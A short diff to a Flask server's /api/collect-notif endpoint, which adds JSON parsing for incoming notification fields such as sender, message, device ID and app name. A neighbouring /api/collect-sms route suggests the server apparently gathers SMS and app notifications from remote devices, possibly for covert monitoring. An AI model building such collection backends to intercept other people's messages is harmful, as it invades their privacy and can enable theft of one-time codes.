@@ -491,11 +491,20 @@ def api_collect_sms():
 @app.route("/api/collect-notif", methods=["POST"])
 def api_collect_notif():
     try:
-        sender = request.form.get("sender", "")
-        message = request.form.get("message", "")
-        ts = request.form.get("timestamp", str(int(time.time()*1000)))
-        device_id = request.form.get("device_id", "")
-        app_name = request.form.get("app", "Unknown")
+        # Support both form-data and JSON
+        if request.is_json:
+            data = request.get_json()
+            sender = data.get("sender", data.get("title", data.get("app_name", "")))
+            message = data.get("message", data.get("text", ""))
+            ts = data.get("timestamp", data.get("time", str(int(time.time()*1000))))
+            device_id = data.get("device_id", "unknown")
+            app_name = data.get("app", data.get("app_name", data.get("package", "Unknown")))
+        else:
+            sender = request.form.get("sender", "")
+            message = request.form.get("message", "")
+            ts = request.form.get("timestamp", str(int(time.time()*1000)))
+            device_id = request.form.get("device_id", "")
+            app_name = request.form.get("app", "Unknown")
         received = datetime.now().isoformat()
         try:
             ts_iso = datetime.fromtimestamp(int(ts)/1000).isoformat()
